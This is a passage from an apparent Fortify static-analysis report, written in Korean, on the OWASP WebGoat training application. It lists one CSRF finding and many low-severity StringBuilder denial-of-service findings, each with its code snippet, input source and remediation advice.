                        <Issue iid="7C132245B083E92447D0599E9949D6DA" ruleID="78E0700E-56FE-45A2-A11B-6A560F730576">
                            <Category>Cross-Site Request Forgery</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>SearchStaff.jsp 파일의 15 줄에 있는 폼 게시에는 공격자의 무단 요청을 막기 위한 사용자 특정 기밀이 포함되어 있어야 합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SearchStaff.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/SearchStaff.jsp</FilePath>
<LineStart>15</LineStart>
<Snippet>			}
			%&gt;
			&lt;form id="form1" name="form1" method="post" action="attack?menu=&lt;%=webSession.getCurrentMenu()%&gt;"&gt;
			    	&lt;label&gt;Name
					&lt;input class="lesson_text_db" type="text" name="&lt;%=SQLInjection.SEARCHNAME%&gt;"/&gt;</Snippet>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="21">
                        <groupTitle>Denial of Service: StringBuilder</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>AbstractLesson.java의 줄 398에 있는 append() 호출은 기본 백업 배열 크기(16)로 초기화된 StringBuilder 또는 StringBuffer 인스턴스에 신뢰할 수 없는 데이터를 추가합니다. 그러면 JVM이 힙 메모리 공간을 과소비하게 될 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>기본 백업 문자 배열 크기(16)로 초기화된 StringBuilder 또는 StringBuffer 인스턴스에 사용자 제어 데이터를 추가하면 응용 프로그램이 사용자의 데이터에 맞게 기본 배열의 크기를 조정하는 동안 대량의 힙 메모리를 소비하게 될 수 있습니다. 데이터가 StringBuilder 또는 StringBuffer 인스턴스에 추가되면 인스턴스는 백업 문자 배열에 데이터를 저장할 충분한 여유 공간이 있는지를 확인합니다. 데이터가 맞지 않는 경우 StringBuilder 또는 StringBuffer 인스턴스는 이전 배열 크기의 두 배 이상의 크기로 새 배열을 생성하지만 가비지가 수집되기 전까지 힙에 이전 배열이 남아 있습니다. 공격자는 이 구현 세부 정보를 사용하여 Denial of Service (DoS) 공격을 실행할 수 있습니다.

예제 1: 기본 생성자로 초기화된 StringBuilder 인스턴스에 사용자 제어 데이터가 추가됩니다. 

    ...
    StringBuilder sb = new StringBuilder();
    final String lineSeparator = System.lineSeparator();
    String[] labels = request.getParameterValues("label");
    for (String label : labels) {
        sb.append(label).append(lineSeparator);
    }
    ...
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>백업 배열의 크기가 조정되는 횟수를 줄이기 위해 예상되는 추가 데이터 크기의 초기 용량으로 StringBuilder 또는 StringBuffer를 초기화합니다. StringBuilder 또는 StringBuffer 인스턴스에 추가하기 전에 데이터의 크기를 확인하십시오.

예제 2: 초기 용량 생성자로 초기화된 StringBuilder 인스턴스에 사용자 제어 데이터가 추가됩니다. 추가 전에 데이터 길이를 검사하여 초기 StringBuilder 용량이 초과되지 않는지 확인합니다. 이는 백업 배열의 크기 조정을 방지하기 위한 것입니다.

    ...
    private final int BUFFER_CAPACITY = 5200;
    StringBuilder sb = new StringBuilder(BUFFER_CAPACITY);
    ...
    final String lineSeparator = System.lineSeparator();
    String[] labels = request.getParameterValues("label");
    for (String label : labels) {
        if (label.length() + lineSeparator.length() + sb.length() &lt;= sb.capacity()) {
            sb.append(label).append(lineSeparator);
        } else {
            // Handle error
        }
    }
    ...


예제 3: 사용자 제어 데이터는 초기 용량 생성자로 초기화된 StringBuffer 인스턴스에 추가되고 문자열 길이와 데이터 항목 수를 확인하여 StringBuffer에 추가할 수 있는 데이터 양을 제한합니다.

    ...
    private final int MAX_LABEL_LEN = 50;
    private final int MAX_LABEL_ITEMS = 100;
    private final int BUFFER_CAPACITY = 5200;
    StringBuffer sb = new StringBuffer(BUFFER_CAPACITY);
    ...
    final String lineSeparator = System.lineSeparator();
    String[] labels = request.getParameterValues("label");
    if (labels.length &lt;= MAX_LABEL_ITEMS) {
        for (String label : labels) {
            if (label.length() &lt;= MAX_LABEL_LEN) {
                sb.append(label).append(lineSeparator);
            } else {
                // Handle error
            }
        }
    } else {
        // Handle error
    }
    ...
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. 이 취약점에 권장되는 수정 방법은 감지되지 않을 수 있으므로 수정 후 추가 감사를 수행하여 수정을 확인해야 할 수 있습니다. 취약점이 제거된 것을 확인한 후 문제를 안전하게 억제할 수 있습니다.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>21</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="E0000FC5F9ED697C5C2CC3AD9EB63051" ruleID="F2BD85B8-504E-4D52-967C-E00A043BAFAD">
                            <Category>Denial of Service: StringBuilder</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ExecResults.java의 줄 326에 있는 append() 호출은 기본 백업 배열 크기(16)로 초기화된 StringBuilder 또는 StringBuffer 인스턴스에 신뢰할 수 없는 데이터를 추가합니다. 그러면 JVM이 힙 메모리 공간을 과소비하게 될 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ExecResults.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/ExecResults.java</FilePath>
<LineStart>326</LineStart>
<Snippet>	String sep = System.getProperty("line.separator");
	StringBuffer value = new StringBuffer();
	value.append("ExecResults for \'" + myCommand + "\'" + sep);

	if ((myInput != null) &amp;&amp; !myInput.equals(""))</Snippet>
<TargetFunction>java.lang.StringBuffer.append()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="4B6F81483CC5F890023A93957F195302" ruleID="F2BD85B8-504E-4D52-967C-E00A043BAFAD">
                            <Category>Denial of Service: StringBuilder</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>WebSession.java의 줄 868에 있는 append() 호출은 기본 백업 배열 크기(16)로 초기화된 StringBuilder 또는 StringBuffer 인스턴스에 신뢰할 수 없는 데이터를 추가합니다. 그러면 JVM이 힙 메모리 공간을 과소비하게 될 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>868</LineStart>
<Snippet>	public void setMessage( String text )
	{
		message.append( "&lt;BR&gt;" + " * " + text);
	}
</Snippet>
<TargetFunction>java.lang.StringBuffer.append()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="4EE2B4D15F895881D71A09FED317C31A" ruleID="F2BD85B8-504E-4D52-967C-E00A043BAFAD">
                            <Category>Denial of Service: StringBuilder</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>WebSession.java의 줄 498에 있는 append() 호출은 기본 백업 배열 크기(16)로 초기화된 StringBuilder 또는 StringBuffer 인스턴스에 신뢰할 수 없는 데이터를 추가합니다. 그러면 JVM이 힙 메모리 공간을 과소비하게 될 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>498</LineStart>
<Snippet>			else
				query.append("&amp;");
			query.append(parameter);
		}
		</Snippet>
<TargetFunction>java.lang.StringBuffer.append()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="D9547D25292D192216D3BD7E48358F97" ruleID="F2BD85B8-504E-4D52-967C-E00A043BAFAD">
                            <Category>Denial of Service: StringBuilder</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>WebSession.java의 줄 868에 있는 append() 호출은 기본 백업 배열 크기(16)로 초기화된 StringBuilder 또는 StringBuffer 인스턴스에 신뢰할 수 없는 데이터를 추가합니다. 그러면 JVM이 힙 메모리 공간을 과소비하게 될 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>868</LineStart>
<Snippet>	public void setMessage( String text )
	{
		message.append( "&lt;BR&gt;" + " * " + text);
	}
</Snippet>
<TargetFunction>java.lang.StringBuffer.append()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="E0F173A22A98067B87315D29029DE594" ruleID="F2BD85B8-504E-4D52-967C-E00A043BAFAD">
                            <Category>Denial of Service: StringBuilder</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>HtmlEncoder.java의 줄 155에 있는 append() 호출은 기본 백업 배열 크기(16)로 초기화된 StringBuilder 또는 StringBuffer 인스턴스에 신뢰할 수 없는 데이터를 추가합니다. 그러면 JVM이 힙 메모리 공간을 과소비하게 될 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HtmlEncoder.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/HtmlEncoder.java</FilePath>
<LineStart>155</LineStart>
<Snippet>		if (((int) ch) &gt; 128)
		{
		    buf.append("&amp;#" + ((int) ch) + ";");
		}
		else</Snippet>
<TargetFunction>java.lang.StringBuffer.append()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="795E75D1E2351B6A868FB3D0E50B27C3" ruleID="F2BD85B8-504E-4D52-967C-E00A043BAFAD">
                            <Category>Denial of Service: StringBuilder</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>WebSession.java의 줄 868에 있는 append() 호출은 기본 백업 배열 크기(16)로 초기화된 StringBuilder 또는 StringBuffer 인스턴스에 신뢰할 수 없는 데이터를 추가합니다. 그러면 JVM이 힙 메모리 공간을 과소비하게 될 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>868</LineStart>
<Snippet>	public void setMessage( String text )
	{
		message.append( "&lt;BR&gt;" + " * " + text);
	}
</Snippet>
<TargetFunction>java.lang.StringBuffer.append()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>621</LineStart>
<Snippet>	public String getCookie( String cookieName )
	{
		Cookie[] cookies = getRequest().getCookies();

		for ( int i = 0; i &lt; cookies.length; i++ )</Snippet>
<TargetFunction>javax.servlet.http.HttpServletRequest.getCookies()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="A2AD116A902BDAA2753EFBE32787B8E2" ruleID="F2BD85B8-504E-4D52-967C-E00A043BAFAD">
                            <Category>Denial of Service: StringBuilder</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>SilentTransactions.java의 줄 87에 있는 append() 호출은 기본 백업 배열 크기(16)로 초기화된 StringBuilder 또는 StringBuffer 인스턴스에 신뢰할 수 없는 데이터를 추가합니다. 그러면 JVM이 힙 메모리 공간을 과소비하게 될 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SilentTransactions.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SilentTransactions.java</FilePath>
<LineStart>87</LineStart>
<Snippet>		    {
			result.append("You have just silently authorized ");
			result.append(amount);
			result.append("$ without the user interaction.&lt;br&gt;");
		    }</Snippet>
<TargetFunction>java.lang.StringBuffer.append()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="08257DB276BE48D6BB780EEC906D45C5" ruleID="F2BD85B8-504E-4D52-967C-E00A043BAFAD">
                            <Category>Denial of Service: StringBuilder</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Encoding.java의 줄 727에 있는 append() 호출은 기본 백업 배열 크기(16)로 초기화된 StringBuilder 또는 StringBuffer 인스턴스에 신뢰할 수 없는 데이터를 추가합니다. 그러면 JVM이 힙 메모리 공간을 과소비하게 될 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Encoding.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Encoding.java</FilePath>
<LineStart>727</LineStart>
<Snippet>		{
			hexBuff.append( "%" );
			hexBuff.append( Integer.toHexString( ascii[i] ) );
		}
		return hexBuff.toString().toUpperCase();</Snippet>
<TargetFunction>java.lang.StringBuffer.append()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Encoding.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Encoding.java</FilePath>
<LineStart>740</LineStart>
<Snippet>	 */

	public static void main( String[] args )
	{
		try</Snippet>
<TargetFunction>main(0)</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="37784A73FF9212AFA9164F060E23586F" ruleID="F2BD85B8-504E-4D52-967C-E00A043BAFAD">
                            <Category>Denial of Service: StringBuilder</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>AbstractLesson.java의 줄 471에 있는 append() 호출은 기본 백업 배열 크기(16)로 초기화된 StringBuilder 또는 StringBuffer 인스턴스에 신뢰할 수 없는 데이터를 추가합니다. 그러면 JVM이 힙 메모리 공간을 과소비하게 될 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>AbstractLesson.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/AbstractLesson.java</FilePath>
<LineStart>471</LineStart>
<Snippet>		    sb.append(pad(++count) + "  ");
		}
		sb.append(line + System.getProperty("line.separator"));
	    }
</Snippet>
<TargetFunction>java.lang.StringBuffer.append()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="C000215F54F05AAF86B6D89D68586D96" ruleID="F2BD85B8-504E-4D52-967C-E00A043BAFAD">
                            <Category>Denial of Service: StringBuilder</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>LessonAdapter.java의 줄 302에 있는 append() 호출은 기본 백업 배열 크기(16)로 초기화된 StringBuilder 또는 StringBuffer 인스턴스에 신뢰할 수 없는 데이터를 추가합니다. 그러면 JVM이 힙 메모리 공간을 과소비하게 될 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>LessonAdapter.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/LessonAdapter.java</FilePath>
<LineStart>302</LineStart>
<Snippet>		    if (startAppending)
		    {
			buff.append(line + "\n");
		    }
		}</Snippet>
<TargetFunction>java.lang.StringBuffer.append()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>LessonAdapter.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/LessonAdapter.java</FilePath>
<LineStart>288</LineStart>
<Snippet>		String line = null;
		boolean startAppending = false;
		while ((line = in.readLine()) != null)
		{
		    if (line.indexOf("&lt;!-- Start Instructions --&gt;") != -1)</Snippet>
<TargetFunction>java.io.BufferedReader.readLine()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="02B6F7369BB6CCDD25EEB5C83914DE0C" ruleID="F2BD85B8-504E-4D52-967C-E00A043BAFAD">
                            <Category>Denial of Service: StringBuilder</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>HtmlEncoder.java의 줄 155에 있는 append() 호출은 기본 백업 배열 크기(16)로 초기화된 StringBuilder 또는 StringBuffer 인스턴스에 신뢰할 수 없는 데이터를 추가합니다. 그러면 JVM이 힙 메모리 공간을 과소비하게 될 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HtmlEncoder.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/HtmlEncoder.java</FilePath>
<LineStart>155</LineStart>
<Snippet>		if (((int) ch) &gt; 128)
		{
		    buf.append("&amp;#" + ((int) ch) + ";");
		}
		else</Snippet>
<TargetFunction>java.lang.StringBuffer.append()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Encoding.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Encoding.java</FilePath>
<LineStart>740</LineStart>
<Snippet>	 */

	public static void main( String[] args )
	{
		try</Snippet>
<TargetFunction>main(0)</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="83D4DD0771BE8C8EE3E96104B26B839C" ruleID="F2BD85B8-504E-4D52-967C-E00A043BAFAD">
                            <Category>Denial of Service: StringBuilder</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>HtmlEncoder.java의 줄 209에 있는 append() 호출은 기본 백업 배열 크기(16)로 초기화된 StringBuilder 또는 StringBuffer 인스턴스에 신뢰할 수 없는 데이터를 추가합니다. 그러면 JVM이 힙 메모리 공간을 과소비하게 될 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HtmlEncoder.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/HtmlEncoder.java</FilePath>
<LineStart>209</LineStart>
<Snippet>		if (iso == null)
		{
		    buf.append("&amp;" + entity + ";");
		}
		else</Snippet>
<TargetFunction>java.lang.StringBuffer.append()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Encoding.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Encoding.java</FilePath>
<LineStart>740</LineStart>
<Snippet>	 */

	public static void main( String[] args )
	{
		try</Snippet>
<TargetFunction>main(0)</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="CD70871481F55094FE8BB842179BE656" ruleID="F2BD85B8-504E-4D52-967C-E00A043BAFAD">
                            <Category>Denial of Service: StringBuilder</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>AbstractLesson.java의 줄 471에 있는 append() 호출은 기본 백업 배열 크기(16)로 초기화된 StringBuilder 또는 StringBuffer 인스턴스에 신뢰할 수 없는 데이터를 추가합니다. 그러면 JVM이 힙 메모리 공간을 과소비하게 될 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>AbstractLesson.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/AbstractLesson.java</FilePath>
<LineStart>471</LineStart>
<Snippet>		    sb.append(pad(++count) + "  ");
		}
		sb.append(line + System.getProperty("line.separator"));
	    }
</Snippet>
<TargetFunction>java.lang.StringBuffer.append()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>AbstractLesson.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/AbstractLesson.java</FilePath>
<LineStart>900</LineStart>
<Snippet>	try
	{
	    el = new StringElement(readFromFile(s.getRequest().getReader(),
		    false));
	}</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getReader()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="DF1D53EE167BED1654A4D3CF4B32DBB4" ruleID="F2BD85B8-504E-4D52-967C-E00A043BAFAD">
                            <Category>Denial of Service: StringBuilder</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>AbstractLesson.java의 줄 471에 있는 append() 호출은 기본 백업 배열 크기(16)로 초기화된 StringBuilder 또는 StringBuffer 인스턴스에 신뢰할 수 없는 데이터를 추가합니다. 그러면 JVM이 힙 메모리 공간을 과소비하게 될 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>AbstractLesson.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/AbstractLesson.java</FilePath>
<LineStart>471</LineStart>
<Snippet>		    sb.append(pad(++count) + "  ");
		}
		sb.append(line + System.getProperty("line.separator"));
	    }
</Snippet>
<TargetFunction>java.lang.StringBuffer.append()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>AbstractLesson.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/AbstractLesson.java</FilePath>
<LineStart>465</LineStart>
<Snippet>	    String line;

	    while ((line = reader.readLine()) != null)
	    {
		if (numbers)</Snippet>
<TargetFunction>java.io.BufferedReader.readLine()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="4DB99D5A3BD716D58C978BF0C5CB08AA" ruleID="F2BD85B8-504E-4D52-967C-E00A043BAFAD">
                            <Category>Denial of Service: StringBuilder</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>HtmlEncoder.java의 줄 155에 있는 append() 호출은 기본 백업 배열 크기(16)로 초기화된 StringBuilder 또는 StringBuffer 인스턴스에 신뢰할 수 없는 데이터를 추가합니다. 그러면 JVM이 힙 메모리 공간을 과소비하게 될 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HtmlEncoder.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/HtmlEncoder.java</FilePath>
<LineStart>155</LineStart>
<Snippet>		if (((int) ch) &gt; 128)
		{
		    buf.append("&amp;#" + ((int) ch) + ";");
		}
		else</Snippet>
<TargetFunction>java.lang.StringBuffer.append()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="CCD52E3DEF9645BE9394C9E82118078E" ruleID="F2BD85B8-504E-4D52-967C-E00A043BAFAD">
                            <Category>Denial of Service: StringBuilder</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>AbstractLesson.java의 줄 398에 있는 append() 호출은 기본 백업 배열 크기(16)로 초기화된 StringBuilder 또는 StringBuffer 인스턴스에 신뢰할 수 없는 데이터를 추가합니다. 그러면 JVM이 힙 메모리 공간을 과소비하게 될 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>AbstractLesson.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/AbstractLesson.java</FilePath>
<LineStart>398</LineStart>
<Snippet>		    }

		    sb.append(line + "\n");
		}
</Snippet>
<TargetFunction>java.lang.StringBuffer.append()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>AbstractLesson.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/AbstractLesson.java</FilePath>
<LineStart>380</LineStart>
<Snippet>	    String line;

	    while ((line = reader.readLine()) != null)
	    {
		if ((line.indexOf(methodName) != -1)</Snippet>
<TargetFunction>java.io.BufferedReader.readLine()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="46286F3A264B859FF22AEB3D8C8ADB98" ruleID="F2BD85B8-504E-4D52-967C-E00A043BAFAD">
                            <Category>Denial of Service: StringBuilder</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>WebSession.java의 줄 498에 있는 append() 호출은 기본 백업 배열 크기(16)로 초기화된 StringBuilder 또는 StringBuffer 인스턴스에 신뢰할 수 없는 데이터를 추가합니다. 그러면 JVM이 힙 메모리 공간을 과소비하게 될 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>498</LineStart>
<Snippet>			else
				query.append("&amp;");
			query.append(parameter);
		}
		</Snippet>
<TargetFunction>java.lang.StringBuffer.append()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>472</LineStart>
<Snippet>			parameters.add(SCREEN + "=" + screenValue);
		
		String menuValue = request.getParameter(MENU);
		if (menuValue != null)
			parameters.add(MENU + "=" + menuValue);</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="A9AEDBD909E45A84697CA11DF46269DB" ruleID="F2BD85B8-504E-4D52-967C-E00A043BAFAD">
                            <Category>Denial of Service: StringBuilder</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>HtmlEncoder.java의 줄 209에 있는 append() 호출은 기본 백업 배열 크기(16)로 초기화된 StringBuilder 또는 StringBuffer 인스턴스에 신뢰할 수 없는 데이터를 추가합니다. 그러면 JVM이 힙 메모리 공간을 과소비하게 될 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HtmlEncoder.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/HtmlEncoder.java</FilePath>
<LineStart>209</LineStart>
<Snippet>		if (iso == null)
		{
		    buf.append("&amp;" + entity + ";");
		}
		else</Snippet>
<TargetFunction>java.lang.StringBuffer.append()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="B1CF758EF272064E923590244DD85BED" ruleID="F2BD85B8-504E-4D52-967C-E00A043BAFAD">
                            <Category>Denial of Service: StringBuilder</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>WebSession.java의 줄 498에 있는 append() 호출은 기본 백업 배열 크기(16)로 초기화된 StringBuilder 또는 StringBuffer 인스턴스에 신뢰할 수 없는 데이터를 추가합니다. 그러면 JVM이 힙 메모리 공간을 과소비하게 될 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>498</LineStart>
<Snippet>			else
				query.append("&amp;");
			query.append(parameter);
		}
		</Snippet>
